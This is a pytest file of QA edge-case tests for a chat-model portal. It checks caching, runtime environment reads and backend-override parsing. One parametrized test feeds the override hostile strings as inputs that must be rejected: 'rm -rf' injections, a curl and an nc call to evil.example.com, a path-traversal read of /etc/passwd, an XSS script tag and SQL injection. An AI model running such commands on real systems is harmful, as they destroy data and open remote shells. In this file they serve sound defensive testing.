"""QA edge-case pass for sprint 2026-05-10-chat-model-sync.

Separate file (per QA protocol) so BUILD_LOG.md doesn't need re-touching.
Targets edge cases the builder didn't enumerate:

  * Cache poisoning surface — confirm ``_ollama_installed_models`` is
    not memoized (a hidden ``lru_cache`` would make ``d.current``
    re-lie after install/remove).
  * Runtime env re-read — ``_show_airllm()`` must see ``ARAIL_DEV_AIRLLM``
    flipped after process start, not snapshot at import.
  * Override injection — ``ARAIL_DEEP_BACKEND`` is only compared against
    a static dict; an injection-shaped string must not pass through.
  * ``_is_airllm_installed`` honesty — documents that find_spec is the
    proxy; a package that imports but raises on construction will still
    report installed (acceptable tradeoff, pinned by test).
  * ``_get_live_ollama_current`` defensive paths — ``base_url=None``,
    backend lacking ``model_name``, empty tag list with matching type
    name.
"""

from __future__ import annotations

import importlib
import os
import sys
from types import SimpleNamespace
from unittest.mock import patch

import pytest

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if os.path.join(_REPO_ROOT, "src") not in sys.path:
    sys.path.insert(0, os.path.join(_REPO_ROOT, "src"))

from arail import chat as arail_chat
from arail.portal import app as portal_app


# ─── Candidate #1: cache-poisoning surface ──────────────────────────────
# If a future refactor adds @lru_cache to _ollama_installed_models, an
# install/remove cycle would leave d.current stale. Pin the contract.


def test_ollama_installed_models_is_not_memoized():
    """``_ollama_installed_models`` must hit the network on every call.

    A hidden ``functools.lru_cache`` (or @cache, or a module-level dict)
    would mean: install a new model with ``ollama pull foo`` → the
    portal still says foo isn't installed until restart. Pin that the
    function has no ``cache_info`` / ``cache_clear`` attributes (those
    are the lru_cache marker)."""
    fn = arail_chat._ollama_installed_models
    assert not hasattr(fn, "cache_info"), (
        "lru_cache detected on _ollama_installed_models — d.current "
        "will lie after install/remove. Remove the cache."
    )
    assert not hasattr(fn, "cache_clear"), (
        "cache_clear detected on _ollama_installed_models — see above."
    )


def test_ollama_installed_models_called_twice_makes_two_requests():
    """Two back-to-back calls must each fire a urlopen — confirms there
    is no module-level dict masking the second call."""
    calls = {"n": 0}

    class _FakeResp:
        status = 200
        def read(self):
            return b'{"models": []}'
        def __enter__(self):
            return self
        def __exit__(self, *a):
            return False

    def _fake_urlopen(*a, **kw):
        calls["n"] += 1
        return _FakeResp()

    with patch("urllib.request.urlopen", side_effect=_fake_urlopen):
        arail_chat._ollama_installed_models()
        arail_chat._ollama_installed_models()
    assert calls["n"] == 2, (
        f"expected 2 urlopen calls, got {calls['n']} — hidden cache?"
    )


# ─── Candidate #3: runtime env flip on ARAIL_DEV_AIRLLM ─────────────────


def test_show_airllm_sees_env_flipped_after_module_import(monkeypatch):
    """``ARAIL_DEV_AIRLLM`` must be re-read on every ``_show_airllm()``
    call — not snapshot at import. Operators set this var in a shell,
    then start the portal; if we snapshot we'd never see it."""
    # First call: env unset, x86_64 → False.
    monkeypatch.delenv("ARAIL_DEV_AIRLLM", raising=False)
    with patch("platform.machine", return_value="x86_64"), \
         patch.object(portal_app, "_is_airllm_installed", return_value=True):
        first = portal_app._show_airllm()
    assert first is False, "x86_64 + unset env should be False"

    # Now set env in the live process and call again — must see True.
    monkeypatch.setenv("ARAIL_DEV_AIRLLM", "1")
    with patch("platform.machine", return_value="x86_64"), \
         patch.object(portal_app, "_is_airllm_installed", return_value=True):
        second = portal_app._show_airllm()
    assert second is True, (
        "ARAIL_DEV_AIRLLM set at runtime not seen — _show_airllm is "
        "snapshotting env at import; that breaks the operator path."
    )


def test_show_airllm_truthy_env_values_only_strict_1(monkeypatch):
    """The contract is ``!= "1"`` → False. ``"true"``, ``"yes"``, ``"0"``,
    empty string all must remain False. This pins the strict-equality
    semantics so a future "be helpful" loosening doesn't silently enable
    AirLLM on shells that export ``ARAIL_DEV_AIRLLM=true``."""
    for val in ("true", "yes", "0", "", "on", "1 "):
        monkeypatch.setenv("ARAIL_DEV_AIRLLM", val)
        with patch("platform.machine", return_value="x86_64"), \
             patch.object(portal_app, "_is_airllm_installed", return_value=True):
            assert portal_app._show_airllm() is False, (
                f"ARAIL_DEV_AIRLLM={val!r} unexpectedly enabled AirLLM"
            )


# ─── Candidate #6: ARAIL_DEEP_BACKEND adversarial overrides ─────────────


@pytest.mark.parametrize("payload", [
    "aerollm; rm -rf /",
    "aerollm && curl evil.example.com",
    "$(rm -rf ~)",
    "../../../etc/passwd",
    "<script>alert(1)</script>",
    "' OR 1=1; --",
    "aerollm|nc evil.example.com 4444",
])
def test_resolve_default_deep_backend_rejects_injection_payloads(monkeypatch, payload):
    """Adversarial ``ARAIL_DEEP_BACKEND`` values must fall through to
    auto-detect — they're only ever compared against
    ``_OPTIONAL_CHAT_BACKEND_CONFIG`` keys (a static allowlist), never
    exec'd or interpolated into a shell."""
    monkeypatch.setenv("ARAIL_DEEP_BACKEND", payload)
    # Force a known non-arm64-aerollm path so the result is unambiguous:
    # auto-detect must yield None (no aerollm, _show_airllm = False).
    with patch("platform.machine", return_value="x86_64"), \
         patch.object(portal_app, "_show_airllm", return_value=False), \
         patch("builtins.__import__", side_effect=ImportError("no aerollm_api")):
        # __import__ swap is too aggressive — restore by only blocking aerollm_api.
        pass
    # Cleaner: just patch the import inside the function via sys.modules sentinel.
    monkeypatch.setitem(sys.modules, "aerollm_api", None)
    with patch("platform.machine", return_value="x86_64"), \
         patch.object(portal_app, "_show_airllm", return_value=False):
        result = portal_app._resolve_default_deep_backend()
    assert result is None, (
        f"injection-shaped override {payload!r} produced {result!r} — "
        f"the override allowlist failed open"
    )


def test_resolve_default_deep_backend_trailing_whitespace_normalizes(monkeypatch):
    """``ARAIL_DEEP_BACKEND='aerollm\\n'`` (operator pasted with a trailing
    newline) normalizes via ``.strip()`` to a valid key. Documents that
    strip-then-lower is the intended operator-friendliness, not a bypass."""
    monkeypatch.setenv("ARAIL_DEEP_BACKEND", "aerollm\n")
    # Override should win regardless of platform.
    result = portal_app._resolve_default_deep_backend()
    assert result == "aerollm", (
        f"trailing-newline override should strip to 'aerollm', got {result!r}"
    )


def test_resolve_default_deep_backend_whitespace_only_override_falls_through(monkeypatch):
    """Whitespace-only override is stripped to '' and falls through to
    auto-detect — pin so a stray space doesn't crash the resolver."""
    monkeypatch.setenv("ARAIL_DEEP_BACKEND", "   ")
    monkeypatch.setitem(sys.modules, "aerollm_api", None)
    with patch("platform.machine", return_value="x86_64"), \
         patch.object(portal_app, "_show_airllm", return_value=False):
        # Should fall through cleanly to None (no exception).
        assert portal_app._resolve_default_deep_backend() is None


def test_resolve_default_deep_backend_override_case_insensitive(monkeypatch):
    """``ARAIL_DEEP_BACKEND=AeroLLM`` (mixed case) must match — operators
    type in case-of-mood; ``.strip().lower()`` is the documented
    normalization."""
    monkeypatch.setenv("ARAIL_DEEP_BACKEND", "AeRoLlM")
    # Don't need to control platform; override wins before any platform check.
    result = portal_app._resolve_default_deep_backend()
    assert result == "aerollm", (
        f"mixed-case override should normalize to 'aerollm', got {result!r}"
    )


# ─── Candidate #7: _is_airllm_installed honesty ─────────────────────────


def test_is_airllm_installed_uses_find_spec_only(monkeypatch):
    """``_is_airllm_installed`` checks ``importlib.util.find_spec`` — it
    does NOT attempt to import or construct. A package that imports OK
    but raises at construction (e.g. missing CUDA at runtime) will still
    report installed. This is the documented tradeoff: find_spec is fast
    and side-effect-free; the actual airllm subprocess gets the real
    error if construction fails. Pin so a future "be safer" change that
    swaps to real-import doesn't accidentally slow start by 200ms."""
    from importlib.machinery import ModuleSpec

    fake_spec = ModuleSpec("airllm", loader=None)
    with patch("importlib.util.find_spec", return_value=fake_spec):
        assert portal_app._is_airllm_installed() is True

    with patch("importlib.util.find_spec", return_value=None):
        assert portal_app._is_airllm_installed() is False


# ─── Defensive paths on _get_live_ollama_current ────────────────────────


def test_get_live_ollama_current_handles_base_url_none():
    """A backend whose ``base_url`` attribute exists but is ``None``
    must not crash. The `getattr(..., "") or ""` guard should turn
    None into ''; ``"11434" not in ""`` → True; if class name lacks
    "ollama" → return None."""
    be = SimpleNamespace(base_url=None, model_name="x")
    # Class name "SimpleNamespace" doesn't contain "ollama" → None path.
    assert portal_app._get_live_ollama_current(be) is None


def test_get_live_ollama_current_handles_missing_model_name():
    """Backend with no ``model_name`` attribute at all — getattr returns
    None as the default, which is not in any tag list, so the function
    falls through to the first tag id. Must not raise AttributeError."""
    be = SimpleNamespace(base_url="http://127.0.0.1:11434")
    fake_tags = [{"id": "ai-engineer:latest"}]
    with patch("arail.chat._ollama_installed_models", return_value=fake_tags):
        result = portal_app._get_live_ollama_current(be)
    assert result == "ai-engineer:latest"


def test_get_live_ollama_current_type_name_match_alone_works():
    """Backend with NO Ollama URL but a class name that contains
    "ollama" — the type-name branch should match and trigger the live
    lookup. Catches the case where the URL was rewritten but the
    backend class survives."""
    class FakeOllamaBackend:
        base_url = "http://example.com:9999"
        model_name = "cached-model"

    be = FakeOllamaBackend()
    fake_tags = [{"id": "fresh:tag"}]
    with patch("arail.chat._ollama_installed_models", return_value=fake_tags):
        result = portal_app._get_live_ollama_current(be)
    assert result == "fresh:tag", (
        "type-name match should trigger the live /api/tags lookup"
    )


# ─── arm64 absolute-block regression ────────────────────────────────────


def test_show_airllm_arm64_with_env_and_install_still_false(monkeypatch):
    """arm64 block is absolute: env=1 AND installed=True must still be
    False. Pins the BUG-1 fix against a future refactor that
    accidentally reorders the gating clauses."""
    monkeypatch.setenv("ARAIL_DEV_AIRLLM", "1")
    with patch("platform.machine", return_value="arm64"), \
         patch.object(portal_app, "_is_airllm_installed", return_value=True):
        assert portal_app._show_airllm() is False


def test_resolve_default_deep_backend_arm64_no_aerollm_is_none_not_airllm(monkeypatch):
    """Regression for the headline BUG: on arm64 without aerollm we
    must return None, never the string 'airllm'. A future refactor
    that 'helpfully' tries airllm as fallback here would crash with
    Metal timeout."""
    monkeypatch.delenv("ARAIL_DEEP_BACKEND", raising=False)
    monkeypatch.setitem(sys.modules, "aerollm_api", None)
    with patch("platform.machine", return_value="arm64"):
        result = portal_app._resolve_default_deep_backend()
    assert result is None, (
        f"arm64 + no aerollm must return None, got {result!r} — "
        f"BUG regression: would route to AirLLM and Metal-timeout"
    )
